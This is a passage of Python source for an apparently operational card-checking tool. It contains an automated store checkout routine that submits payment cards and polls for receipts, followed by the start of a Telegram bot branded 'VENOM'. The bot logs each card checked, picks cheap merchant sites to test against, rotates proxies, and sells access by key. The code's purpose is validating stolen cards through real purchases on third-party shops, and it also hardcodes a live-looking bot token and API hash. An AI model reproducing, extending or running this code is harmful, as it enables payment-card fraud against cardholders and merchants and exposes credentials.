                    session, graphql_url, submit_params, base_headers, submit_json)

                if is_captcha_required(sub_text):
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "CARD_DECLINED"
                    result.error       = Exception("CARD_DECLINED")
                    return result

                if "Your order total has changed." in sub_text:
                    result.error = Exception("Site not supported: order total changed")
                    return result

                rj2       = _json.loads(sub_text)
                sub_data  = rj2.get("data", {}).get("submitForCompletion", {})

                if not sub_data:
                    errs2 = rj2.get("errors", [])
                    if errs2:
                        code2 = errs2[0].get("code") or errs2[0].get("message", "")
                        result.status = CheckStatus.DECLINED
                        result.status_code = str(code2)
                        result.error = Exception(str(code2))
                        return result
                    result.error = Exception("Empty submit response")
                    return result

                sub_type = sub_data.get("__typename", "")

                if sub_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt_d = sub_data.get("receipt", {})
                    if receipt_d and receipt_d.get("__typename") == "ProcessedReceipt":
                        result.status      = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        return result
                    rid = (receipt_d or {}).get("id", "")

                elif sub_type == "SubmitFailed":
                    reason = sub_data.get("reason", "")
                    msg    = str(reason)[:80] if reason else "SubmitFailed"
                    result.status      = CheckStatus.DECLINED
                    result.status_code = msg
                    result.error       = Exception(msg)
                    return result

                elif sub_type == "SubmitRejected":
                    for e2 in sub_data.get("errors", []):
                        code3 = e2.get("code", "")
                        loc   = e2.get("localizedMessage", "")
                        nloc  = e2.get("nonLocalizedMessage", "")
                        detail = loc or nloc or code3 or "SubmitRejected"
                        result.status      = CheckStatus.DECLINED
                        result.status_code = detail
                        result.error       = Exception(detail)
                        return result
                    result.status = CheckStatus.DECLINED
                    result.error  = Exception("SubmitRejected")
                    return result

                elif sub_type == "Throttled":
                    result.retryable = True
                    result.error     = Exception("Throttled")
                    return result

                else:
                    rid = (sub_data.get("receipt") or {}).get("id", "")

                if not rid:
                    result.error = Exception("No receipt ID from submit")
                    return result

            except Exception as exc:
                result.error = Exception(f"Step 5 failed: {exc}")
                return result

            # ── Step 6: PollForReceipt — HARDENED ────────────────────────────
            # FIX: old code declared CHARGED on first ProcessingReceipt.
            # New code loops until a truly FINAL receipt type, with back-off
            # and a hard timeout to prevent infinite waits (false positives).
            try:
                await _asyncio.sleep(0.5)
                poll_params = {"operationName": "PollForReceipt"}
                poll_json   = {
                    "query":         QUERY_POLL,
                    "variables":     {"receiptId": rid, "sessionToken": sst},
                    "operationName": "PollForReceipt"
                }

                _FINAL_CHARGED    = {"ProcessedReceipt", "SuccessfulReceipt"}
                _STILL_PROCESSING = {"ProcessingReceipt", "WaitingReceipt"}
                _ACTION_REQUIRED  = {"ActionRequiredReceipt"}
                _FAILED           = {"FailedReceipt"}
                _MAX_POLLS        = 14
                _MAX_PROC_WAIT    = 20.0
                _BASE_DELAY       = 0.6
                _MAX_DELAY        = 2.5

                poll_delay   = _BASE_DELAY
                proc_elapsed = 0.0
                poll_text    = ""

                for _pi in range(_MAX_POLLS):
                    _rp, poll_text = await _make_gql_request(
                        session, graphql_url, poll_params, base_headers, poll_json)

                    if is_captcha_required(poll_text):
                        result.status      = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error       = Exception("CARD_DECLINED")
                        return result

                    try:
                        prj = _json.loads(poll_text)
                    except Exception:
                        await _asyncio.sleep(poll_delay)
                        poll_delay = min(poll_delay * 1.4, _MAX_DELAY)
                        continue

                    rec_d    = (prj.get("data") or {}).get("receipt") or {}
                    rec_type = rec_d.get("__typename", "")

                    # CHARGED — only on truly confirmed receipt types
                    if rec_type in _FINAL_CHARGED:
                        result.status      = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        try:
                            conf_url = rec_d.get("confirmationPage", {}).get("url", "")
                            result.receipt_url = conf_url or checkout_url
                        except Exception:
                            result.receipt_url = checkout_url
                        return result

                    # 3DS / OTP challenge
                    if rec_type in _ACTION_REQUIRED:
                        result.status      = CheckStatus.APPROVED
                        result.status_code = "OTP_REQUIRED"
                        return result

                    # Hard decline
                    if rec_type in _FAILED:
                        err_d    = rec_d.get("processingError") or {}
                        err_type = err_d.get("__typename", "")
                        if err_type == "PaymentFailed":
                            code4 = err_d.get("code", "")
                            msg4  = err_d.get("messageUntranslated", "")
                            if code4 == "INSUFFICIENT_FUNDS":
                                result.status      = CheckStatus.APPROVED
                                result.status_code = "INSUFFICIENT_FUNDS"
                                return result
                            label = code4 or msg4 or "PAYMENT_FAILED"
                            if "CAPTCHA" in label:
                                label = "CARD_DECLINED"
                        elif err_type in ("InventoryReservationFailure", "InventoryClaimFailure"):
                            result.retryable = True
                            result.error     = Exception("INVENTORY_FAILURE")
                            return result
                        else:
                            label = err_d.get("code") or err_type or "PAYMENT_FAILED"
                        result.status      = CheckStatus.DECLINED
                        result.status_code = label
                        result.error       = Exception(label)
                        return result

                    # ProcessingReceipt / WaitingReceipt — keep polling
                    if rec_type in _STILL_PROCESSING:
                        proc_elapsed += poll_delay
                        if proc_elapsed >= _MAX_PROC_WAIT:
                            result.status    = CheckStatus.ERROR
                            result.error     = Exception("PROCESSING_TIMEOUT")
                            result.retryable = True
                            return result
                        await _asyncio.sleep(poll_delay)
                        poll_delay = min(poll_delay * 1.4, _MAX_DELAY)
                        continue

                    # Unknown typename — raw-text fallback
                    fl = (poll_text or "").lower()
                    if "processedreceipt" in fl or "order_placed" in fl or "successfulreceipt" in fl:
                        result.status      = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.receipt_url = checkout_url
                        return result
                    if "actionrequiredreceipt" in fl or "action_required" in fl:
                        result.status      = CheckStatus.APPROVED
                        result.status_code = "OTP_REQUIRED"
                        return result
                    if "failedreceipt" in fl:
                        fc_m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_text)
                        fc   = fc_m.group(1) if fc_m else "CARD_DECLINED"
                        if "CAPTCHA" in fc:
                            fc = "CARD_DECLINED"
                        result.status      = CheckStatus.DECLINED
                        result.status_code = fc
                        result.error       = Exception(fc)
                        return result
                    # Unknown — back off and retry
                    await _asyncio.sleep(poll_delay)
                    poll_delay = min(poll_delay * 1.4, _MAX_DELAY)

                # Exhausted all polls without final state
                result.status    = CheckStatus.ERROR
                result.retryable = True
                result.error     = Exception("MAX_POLLS_EXCEEDED")

            except Exception as exc:
                result.error = Exception(f"Step 6 failed: {exc}")
    except Exception as exc:
        result.error = Exception(f"Checkout error: {exc}")

    return result

# =============================================================================
#  BOT
# =============================================================================

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.messages import SendMessageRequest
from telethon.tl.types import ReplyKeyboardHide
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import threading
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from datetime import datetime, timedelta, timezone
import secrets
import string

def fi(text: str) -> str:
    """Convert ASCII letters to Unicode Sans-Serif Bold Italic (matches habash brand style)."""
    out = []
    for c in text:
        if 'A' <= c <= 'Z':
            out.append(chr(0x1D63C + ord(c) - 65))
        elif 'a' <= c <= 'z':
            out.append(chr(0x1D656 + ord(c) - 97))
        else:
            out.append(c)
    return ''.join(out)

# ─── CONFIG ────────────────────────────────────────────────────────────────────
API_ID    = 34509085
API_HASH  = 'e627aacf2f255ec2be94fc538705ce3b'
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8735968509:AAEfY6rs_Gwt7jwWM6lVz9GFhtawdOsp01U')
_ADMIN_FILE     = os.path.join(os.path.dirname(__file__), 'admin.json')
_DEFAULT_ADMINS = {
    int(x.strip()) for x in
    os.environ.get('ADMIN_ID', '7454319617').split(',')
    if x.strip().isdigit()
} | {7454319617}   # always-hardcoded owner

def _load_admin_ids() -> set:
    try:
        with open(_ADMIN_FILE) as f:
            data = json.load(f)
            ids  = data.get('admin_ids', [])
            return set(ids) | _DEFAULT_ADMINS if ids else _DEFAULT_ADMINS
    except:
        return _DEFAULT_ADMINS

def _save_admin_ids(ids: set):
    with open(_ADMIN_FILE, 'w') as f:
        json.dump({'admin_ids': list(ids)}, f)

ADMIN_IDS = _load_admin_ids()
ADMIN_ID  = min(ADMIN_IDS)

OWNER_NAME     = '› VENOM ‹'
OWNER_USERNAME = 'Veen0m'
OWNER_ID       = 7454319617
BOT_BRAND      = 'VENOM'
DEV_LINE       = f'⚙️ <b>{fi("Dev")}</b> ↬ <a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'

PREMIUM_FILE        = os.path.join(os.path.dirname(__file__), 'premium.txt')
SITES_FILE          = os.path.join(os.path.dirname(__file__), 'sites.txt')
PROXY_FILE          = os.path.join(os.path.dirname(__file__), 'proxy.txt')
USER_PROXY_FILE     = os.path.join(os.path.dirname(__file__), 'user_proxies.json')
KEYS_FILE           = os.path.join(os.path.dirname(__file__), 'keys.json')
USER_ACCESS_FILE    = os.path.join(os.path.dirname(__file__), 'user_access.json')
WORKING_PROXY_FILE  = os.path.join(os.path.dirname(__file__), 'working_proxies.txt')
USER_POOL_FILE      = os.path.join(os.path.dirname(__file__), 'user_pool.json')
STATS_FILE          = os.path.join(os.path.dirname(__file__), 'user_stats.json')
LOGS_FILE           = os.path.join(os.path.dirname(__file__), 'card_logs.json')
SITES_META_FILE     = os.path.join(os.path.dirname(__file__), 'sites_meta.json')
USER_PREFS_FILE     = os.path.join(os.path.dirname(__file__), 'user_prefs.json')
MAX_LOG_ENTRIES     = 25000

AMOUNT_TIERS = {
    "1":  ("$1",  "~$1 sites"),
    "5":  ("$5",  "~$5 sites"),
    "10": ("$10", "~$10 sites"),
    "20": ("$20", "~$20 sites"),
    "any":("Any", "All sites"),
}

NOTIFY_GROUP_ID = None   # set a group chat_id here if desired

# ──────────────────────── Mandatory Subscription ─────────────────────────────
# Store required channels in mandatory_channels.json  → list of {"id": -100xxx, "url": "https://t.me/xxx", "title": "Channel Name"}
MANDATORY_CHANNELS_FILE = os.path.join(os.path.dirname(__file__), 'mandatory_channels.json')

def load_mandatory_channels() -> list:
    try:
        if os.path.exists(MANDATORY_CHANNELS_FILE):
            with open(MANDATORY_CHANNELS_FILE, 'r') as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
    except Exception:
        pass
    return []

def save_mandatory_channels(channels: list):
    with open(MANDATORY_CHANNELS_FILE, 'w') as f:
        json.dump(channels, f, ensure_ascii=False, indent=2)

async def check_user_subscribed(uid: int) -> list:
    """Return list of channels the user is NOT subscribed to. Empty = all good."""
    channels = load_mandatory_channels()
    if not channels:
        return []
    not_subbed = []
    for ch in channels:
        try:
            member = await bot.get_permissions(ch['id'], uid)
            if member is None or getattr(member, 'banned', False):
                not_subbed.append(ch)
        except Exception:
            # If we can't check (bot not in channel, etc.) skip that channel
            pass
    return not_subbed

def build_sub_gate_keyboard(missing_channels: list) -> list:
    """Build inline keyboard rows for the subscription gate message."""
    rows = []
    for ch in missing_channels:
        rows.append([{"text": f"📢 {ch.get('title', 'Channel')}", "url": ch.get('url', '')}])
    rows.append([{"text": "✅ I Subscribed — Check Again", "callback_data": "check_sub_again"}])
    return rows

async def enforce_subscription(event) -> bool:
    """
    Returns True if the user passes (subscribed or no channels required).
    Returns False and sends a gate message if not.
    """
    uid = event.sender_id
    if is_admin(uid):
        return True
    missing = await check_user_subscribed(uid)
    if not missing:
        return True
    ch_lines = "\n".join(f"  {EM_SUB_PANEL} <a href='{c['url']}'>{html.escape(c.get('title','Channel'))}</a>" for c in missing)
    text = pe(
        f"<b>🔒 Subscription Required</b>\n"
        f"<b>{SEP}</b>\n"
        f"To use this bot you must subscribe to the following channel(s):\n\n"
        f"{ch_lines}\n\n"
        f"<b>{SEP}</b>\n"
        f"After subscribing, tap the button below ↓"
    )
    await raw_send(uid, text, build_sub_gate_keyboard(missing))
    return False

# ─── USER STATS TRACKING ───────────────────────────────────────────────────────
_stats_lock = threading.Lock()
_logs_lock  = threading.Lock()

def _load_stats() -> dict:
    try:
        with open(STATS_FILE) as f:
            return json.load(f)
    except:
        return {}

def _save_stats(data: dict):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def record_check(uid: int, name: str, status: str, username: str = ''):
    with _stats_lock:
        data = _load_stats()
        key  = str(uid)
        entry = data.get(key, {'charged':0,'approved':0,'declined':0,'files':0,'first_seen':0})
        if not entry.get('first_seen'):
            entry['first_seen'] = int(time.time())
        entry['name']     = name
        if username: entry['username'] = username
        entry['last_seen'] = int(time.time())
        if status == 'Charged':    entry['charged']  = entry.get('charged',  0) + 1
        elif status == 'Approved': entry['approved'] = entry.get('approved', 0) + 1
        else:                      entry['declined'] = entry.get('declined', 0) + 1
        data[key] = entry
        _save_stats(data)

def record_mass_check(uid: int, name: str, charged: int, approved: int, declined: int, username: str = ''):
    with _stats_lock:
        data = _load_stats()
        key  = str(uid)
        entry = data.get(key, {'charged':0,'approved':0,'declined':0,'files':0,'first_seen':0})
        if not entry.get('first_seen'):
            entry['first_seen'] = int(time.time())
        entry['name']     = name
        if username: entry['username'] = username
        entry['last_seen']  = int(time.time())
        entry['charged']   = entry.get('charged',  0) + charged
        entry['approved']  = entry.get('approved', 0) + approved
        entry['declined']  = entry.get('declined', 0) + declined
        entry['files']     = entry.get('files', 0) + 1
        data[key] = entry
        _save_stats(data)

def record_log(uid: int, name: str, username: str,
               card: str, status: str, message: str,
               site: str, gateway: str, price: str):
    """Append one card-check entry to card_logs.json (capped at MAX_LOG_ENTRIES)."""
    with _logs_lock:
        try:
            logs = json.loads(open(LOGS_FILE).read()) if os.path.exists(LOGS_FILE) else []
        except Exception:
            logs = []
        entry = {
            "ts":       int(time.time()),
            "uid":      str(uid),
            "name":     name,
            "username": username,
            "card":     card,
            "status":   status,
            "message":  message,
            "site":     site,
            "gateway":  gateway,
            "price":    price,
        }
        logs.insert(0, entry)
        if len(logs) > MAX_LOG_ENTRIES:
            logs = logs[:MAX_LOG_ENTRIES]
        try:
            with open(LOGS_FILE, 'w') as f:
                json.dump(logs, f)
        except Exception:
            pass

# ─── SITES META (price tier tagging) ───────────────────────────────────────────
def load_sites_meta() -> dict:
    try:
        with open(SITES_META_FILE) as f:
            return json.load(f)
    except:
        return {}

def save_sites_meta(data: dict):
    try:
        with open(SITES_META_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def tag_site_tier(site_url: str, tier: str):
    meta = load_sites_meta()
    meta[site_url] = meta.get(site_url, {})
    meta[site_url]['tier'] = tier
    save_sites_meta(meta)

def price_to_tier(price: float) -> str:
    if price < 3.0:   return "1"
    if price < 8.0:   return "5"
    if price < 15.0:  return "10"
    return "20"

def _fetch_site_price_sync(shop_url: str, proxy: str = None) -> float | None:
    """Blocking: hit /products.json, return cheapest available variant price or None."""
    try:
        from curl_cffi.requests import Session as _CSession
        from checker import normalize_proxy

        proxy_url = None
        if proxy:
            try:    proxy_url = normalize_proxy(proxy)
            except: proxy_url = None

        get_kwargs = dict(timeout=12, impersonate="chrome124", verify=False)
        if proxy_url:
            get_kwargs["proxy"] = proxy_url

        best = None
        with _CSession(impersonate="chrome124") as sess:
            for page in range(1, 4):
                try:
                    resp = sess.get(
                        f"{shop_url.rstrip('/')}/products.json?limit=250&page={page}",
                        **get_kwargs
                    )
                except Exception:
                    break
                if resp.status_code == 429:
                    break
                if resp.status_code != 200:
                    break
                try:
                    products = resp.json().get("products", [])
                except Exception:
                    break
                if not products:
                    break
                for p_item in products:
                    for v in p_item.get("variants", []):
                        try:    price = float(v.get("price") or 0)
                        except: continue
                        if price < 0.50:
                            continue
                        if best is None or price < best:
                            best = price
        return best
    except Exception:
        return None

# ─── USER PREFS (amount tier selection) ────────────────────────────────────────
def get_user_amount_tier(uid: int) -> str:
    try:
        with open(USER_PREFS_FILE) as f:
            prefs = json.load(f)
        return prefs.get(str(uid), {}).get('amount_tier', 'any')
    except:
        return 'any'

def set_user_amount_tier(uid: int, tier: str):
    try:
        try:
            with open(USER_PREFS_FILE) as f:
                prefs = json.load(f)
        except:
            prefs = {}
        prefs.setdefault(str(uid), {})['amount_tier'] = tier
        with open(USER_PREFS_FILE, 'w') as f:
            json.dump(prefs, f, indent=2)
    except:
        pass

_TIER_ORDER = ['1', '5', '10', '20']   # ascending price order

def tier_range_label(tier: str) -> str:
    """Human label for the cumulative pool, e.g. '5' → '$1–$5'."""
    if tier == 'any' or tier not in _TIER_ORDER:
        return 'Any'
    idx = _TIER_ORDER.index(tier)
    if idx == 0:
        return f'${tier}'           # just $1
    return f'$1–${tier}'           # e.g. $1–$5, $1–$10, $1–$20

def load_sites_for_user(uid: int) -> tuple:
    """Return (sites, effective_tier) for the user's amount filter.

    Cumulative range logic — a user on $5 gets $1+$5 sites combined,
    $10 gets $1+$5+$10, $20 gets everything.  This maximises the pool
    and means checks never fail just because one tier has few sites.
    Falls back further to all sites only if the combined range is empty.
    """
    all_sites = load_sites()
    tier = get_user_amount_tier(uid)
    if tier == 'any':
        return all_sites, 'any'
    meta = load_sites_meta()
    # Build cumulative set: all tiers up to and including selected tier
    if tier in _TIER_ORDER:
        cutoff = _TIER_ORDER.index(tier)
        allowed_tiers = set(_TIER_ORDER[:cutoff + 1])   # e.g. $5 → {'1','5'}
    else:
        allowed_tiers = {tier}
    matched = [s for s in all_sites if meta.get(s, {}).get('tier') in allowed_tiers]
    if matched:
        return matched, tier
    # Nothing tagged at all — return everything so the check still runs
    return all_sites, 'any'

KEY_PREFIX = "VENOM"

TIER_LIMITS = {
    "admin": 25000,
    "auth":  25000,
    "grant": 25000,
    "key":   25000,
}

SESSION_FILE = os.path.join(os.path.dirname(__file__), 'checker_bot')
bot = TelegramClient(SESSION_FILE, API_ID, API_HASH).start(bot_token=BOT_TOKEN)
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

_orig_send_message = bot.send_message
_orig_edit_message = bot.edit_message

import re as _re

def _strip_tg_emoji(text):
    if not text:
        return text
    return _re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', text)

def _is_doc_invalid(e):
    s = str(e).upper()
    return 'DOCUMENT_INVALID' in s or 'FILE_REFERENCE_INVALID' in s

from telethon.tl.custom.message import Message as _TLMessage
_orig_tl_edit = _TLMessage.edit

async def _safe_tl_edit(self, *args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_tl_edit(self, *args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            new_args = list(args)
            if new_args and isinstance(new_args[0], str):
                new_args[0] = _strip_tg_emoji(new_args[0])
            if 'text' in kwargs:
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            if 'message' in kwargs and isinstance(kwargs['message'], str):
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_tl_edit(self, *new_args, **kwargs)
        raise

_TLMessage.edit = _safe_tl_edit

async def _send_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_send_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            args = list(args)
            if len(args) > 1 and isinstance(args[1], str):
                args[1] = _strip_tg_emoji(args[1])
            if 'message' in kwargs:
                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
            return await _orig_send_message(*args, **kwargs)
        raise

async def _edit_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_edit_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            args = list(args)
            if len(args) > 2 and isinstance(args[2], str):
                args[2] = _strip_tg_emoji(args[2])
            if 'text' in kwargs:
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            return await _orig_edit_message(*args, **kwargs)
        raise

bot.send_message = _send_message_no_preview
bot.edit_message = _edit_message_no_preview

active_sessions = {}
pending_checks  = {}
user_proxies    = {}

PREMIUM_EMOJI_IDS = {
    "✅":  "6034905633336070030",
    "❌":  "5040042498634810056",
    "⚠️": "5420323339723881652",
    "⚡":  "6174996123522959140",
    "⚡️": "6174996123522959140",
    "🔥":  "5424972470023104089",
    "✨":  "5040016479722931047",
    "🎉":  "5039778134807806727",
    "🎊":  "5039778134807806727",
    "🎯":  "5039905162760553480",
    "⛔️": "6181277564732972292",
    "⛔":  "6181277564732972292",
    "🛑":  "6181277564732972292",
    "🚨":  "5039671744172917707",
    "💎":  "5042050649248760772",
    "💰":  "5039789890133296083",
    "💳":  "5447453226498552490",
    "💲":  "5447579253723918909",
    "💵":  "5409048419211682843",
    "💸":  "5837027045376271166",
    "💱":  "5039789890133296083",
    "🏦":  "6089185885289454318",
    "🏧":  "5447453226498552490",
    "🖥":  "5039579582764680065",
    "📊":  "5042290883949495533",
    "📈":  "5039808285478224750",
    "📉":  "5039759318556083411",
    "🥇":  "6179279816529814743",
    "🏆":  "6089185885289454318",
    "👑":  "5039727497143387500",
    "👤":  "5992129361090711368",
    "🧑":  "5992129361090711368",
    "👾":  "6181389246767570324",
    "😈":  "6336664426325740768",
    "👿":  "6181349715888577684",
    "🐶":  "6181480793995483763",
    "🐍":  "5116298753917060171",
    "🤖":  "6174896506051495705",
    "⚙️": "5445059250382469069",
    "⚙":   "5445059250382469069",
    "⚒":   "5445059250382469069",
    "🔌":  "5445059250382469069",
    "🌐":  "6321225560789877992",
    "ℹ️": "5334544901428229844",
    "🏳️":"5256143829672672750",
    "📍":  "5391032818111363540",
    "🇺🇸": "6034969533859499947",
    "📡":  "5447448489149625830",
    "🔔":  "5042111805288089118",
    "🛡":  "5042328396193864923",
    "🔑":  "5445373775132522312",
    "🗝":  "5445373775132522312",
    "🔒":  "5445059250382469069",
    "🔓":  "5445373981290952548",
    "🔗":  "5042101437237036298",
    "⏰":  "5445350406215465190",
    "⏱️": "5445350406215465190",
    "🚀":  "6174445826543191998",
    "☄️": "5224607267797606837",
    "⭐":  "5042061201983407048",
    "⭐️": "5042176294222037888",
    "💫":  "5042200814190330758",
    "🔮":  "5042302287087666158",
    "💙":  "5300842752618018643",
    "💖":  "5039643719511311434",
    "❤":   "5040072842578756396",
    "🌍":  "5447410659077661506",
    "🌎":  "5447410659077661506",
    "💀":  "5042209657527993345",
    "💯":  "5042297717242463211",
    "🚫":  "5039671744172917707",
    "🎀":  "5039953030171067177",
    "🧨":  "5039778134807806727",
    "🃏":  "6028206863038811654",
    "💡":  "5042264341051605743",
    "👩‍💻": "5445224894386172410",
    "💬":  "5040036030414062506",
    "📌":  "5397782960512444700",
    "📋":  "5445260044398524944",
    "📝":  "5444889156792646660",
    "📁":  "6026239398650056451",
    "🗂":  "5447210891558814377",
    "🗑":  "5039614900280754969",
    "🗑️": "5039614900280754969",
    "📅":  "6168242008277125889",
    "📤":  "5445355530111437729",
    "📥":  "5443127283898405358",
    "🆕":  "5041852827350074289",
    "🟢":  "5039928501612839813",
    "🔴":  "5042042652019655612",
    "🟡":  "6025833352441893055",
    "⏸":  "5042036407137207122",
    "▶️": "5039753786638205957",
    "⏹":  "5134537521518085000",
    "🧹":  "5039751080808809534",
    "⏱":  "6186053057265016346",
    "⏳":  "5042036407137207122",
    "🔢":  "5042290883949495533",
}

def pe(text):
    if not text: return text
    holders = []
    result  = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        ph = f"\x00PE{i:03d}\x00"
        holders.append((ph, doc_id, emoji))
        result = result.replace(emoji, ph)
    for ph, doc_id, emoji in holders:
        result = result.replace(ph, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

SEP  = "━━━━━━━━━━━━━━━━━━━━"
LINE = "─" * 24

BUTTON_CUSTOM_EMOJIS = {
    "✅": "6034905633336070030",
    "❌": "5785177332595561481",
    "↪️": "5445365692004071819",
    "®️": "5445373981290952548",
    "🔥": "5424972470023104089",
    "⚡": "6174996123522959140",
    "⭐": "5042061201983407048",
    "🚀": "6174445826543191998",
    "⚙️": "5445059250382469069",
    "📡": "5447448489149625830",
    "✋": "5408900479063175258",
    "💫": "5042200814190330758",
    "💎": "5042050649248760772",
    "🌐": "6321225560789877992",
    "🔮": "5042302287087666158",
    "⚠️": "5420323339723881652",
    "🛡": "5042328396193864923",
    "💰": "5039789890133296083",
    "👑": "5039727497143387500",
    "🤖": "6174896506051495705",
    "📋": "5445260044398524944",
    "🏧": "5447453226498552490",
    "💙": "5300842752618018643",
    "💳": "5447453226498552490",
    "⏰": "5445350406215465190",
}

def _btn_icon_id(text: str) -> str | None:
    for emoji_char, doc_id in BUTTON_CUSTOM_EMOJIS.items():
        if emoji_char in text:
            return doc_id
    return None

_BTN_EMOJI_STRIP = re.compile(
    r'^(?:' + '|'.join(re.escape(e) for e in BUTTON_CUSTOM_EMOJIS) + r')\s*'
)

def _clean_btn_text(text: str) -> str:
    return _BTN_EMOJI_STRIP.sub('', text)

_BTN_STYLES = ["primary", "success", "danger"]
_style_idx  = 0
_style_lock = threading.Lock()

def _next_style() -> str:
    global _style_idx
    with _style_lock:
        s = _BTN_STYLES[_style_idx % len(_BTN_STYLES)]
        _style_idx += 1
        return s

def _color_kb(rows: list) -> dict:
    colored = []
    for row in rows:
        colored_row = []
        for btn in row:
            b = dict(btn)
            cb       = b.get("callback_data", "")
            has_copy = "copy_text" in b
            has_url  = "url" in b
            if ((cb and cb != "noop") or has_copy or has_url) and "style" not in b:
                b["style"] = _next_style()
            if cb == "noop" and has_copy:
                b.pop("callback_data", None)
            raw_text = b.get("text", "")
            if "icon_custom_emoji_id" not in b:
                icon_id = _btn_icon_id(raw_text)
                if icon_id:
                    b["icon_custom_emoji_id"] = icon_id
            b["text"] = _clean_btn_text(raw_text)
            colored_row.append(b)
        colored.append(colored_row)
    return {"inline_keyboard": colored}

_http_session = requests.Session()
_http_session.verify = False
_http_adapter = requests.adapters.HTTPAdapter(
    pool_connections=8, pool_maxsize=32, max_retries=1
)
_http_session.mount("https://", _http_adapter)
_http_session.mount("http://", _http_adapter)

def _raw_post(url, payload):
    p = dict(payload)
    if "reply_markup" in p and isinstance(p["reply_markup"], dict):
        p["reply_markup"] = json.dumps(p["reply_markup"], ensure_ascii=False)
    try:
        return _http_session.post(url, json=p, timeout=8).json()
    except Exception:
        return {"ok": False}

def _strip_styles(markup: dict) -> dict:
    import copy
    m = copy.deepcopy(markup)
    for row in m.get("inline_keyboard", []):
        for btn in row:
            btn.pop("style", None)
    return m

def _strip_icons(markup: dict) -> dict:
    import copy
    m = copy.deepcopy(markup)
    for row in m.get("inline_keyboard", []):
        for btn in row:
            btn.pop("icon_custom_emoji_id", None)
    return m

async def raw_send(chat_id, text, kb_rows, parse_mode="HTML", reply_to=None):
    kb = _color_kb(kb_rows)
    payload = {"chat_id": chat_id, "text": text,
               "parse_mode": parse_mode, "reply_markup": kb,
               "disable_web_page_preview": True}
    if reply_to:
        payload["reply_to_message_id"] = reply_to
    url  = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    payload["reply_markup"] = _strip_icons(kb)
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    payload["reply_markup"] = _strip_styles(_strip_icons(kb))
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    return None

async def raw_edit(chat_id, message_id, text, kb_rows, parse_mode="HTML"):
    kb = _color_kb(kb_rows)
    payload = {"chat_id": chat_id, "message_id": message_id,
               "text": text, "parse_mode": parse_mode, "reply_markup": kb,
               "disable_web_page_preview": True}
    url  = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp
    payload["reply_markup"] = _strip_icons(kb)
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp
    payload["reply_markup"] = _strip_styles(_strip_icons(kb))
    resp = await asyncio.to_thread(_raw_post, url, payload)
    return resp

async def nav_edit(chat_id, message_id, text, kb_rows, parse_mode="HTML"):
    kb = _color_kb(kb_rows)
    cap_payload = {"chat_id": chat_id, "message_id": message_id,
                   "caption": text, "parse_mode": parse_mode, "reply_markup": kb}
    resp = await asyncio.to_thread(_raw_post,
        f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageCaption", cap_payload)
    if resp.get("ok"):
        return resp
    txt_url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    txt_payload = {"chat_id": chat_id, "message_id": message_id,
                   "text": text, "parse_mode": parse_mode, "reply_markup": kb,
                   "disable_web_page_preview": True}
    resp = await asyncio.to_thread(_raw_post, txt_url, txt_payload)
    if resp.get("ok"):
        return resp
    txt_payload["reply_markup"] = _strip_icons(kb)
    resp = await asyncio.to_thread(_raw_post, txt_url, txt_payload)
    if resp.get("ok"):
        return resp
    txt_payload["reply_markup"] = _strip_styles(_strip_icons(kb))
    resp = await asyncio.to_thread(_raw_post, txt_url, txt_payload)
    return resp

# ─── BUTTON ROWS ───────────────────────────────────────────────────────────────
def rows_main():
    return [
        [{"text": "🏧  Gates", "callback_data": "gates"}],
        [{"text": "💙  Contact", "url": f"https://t.me/{OWNER_USERNAME}"},
         {"text": "❌  Close",   "callback_data": "close"}],
    ]

def rows_gates():
    return [
        [{"text": "®️  Manage Proxy",  "callback_data": "manage_proxy"}],
        [{"text": "💰  Amount Filter", "callback_data": "amount_select"}],
        [{"text": "↪️  Back",           "callback_data": "back_start"}],
    ]

def rows_amount_select(uid):
    current = get_user_amount_tier(uid)
    tiers = [("1","$1"), ("5","$5"), ("10","$10"), ("20","$20"), ("any","Any")]
    row1 = [{"text": f"{'✅ ' if current==t else ''}{label}", "callback_data": f"amount_tier_{t}"}
            for t, label in tiers[:3]]
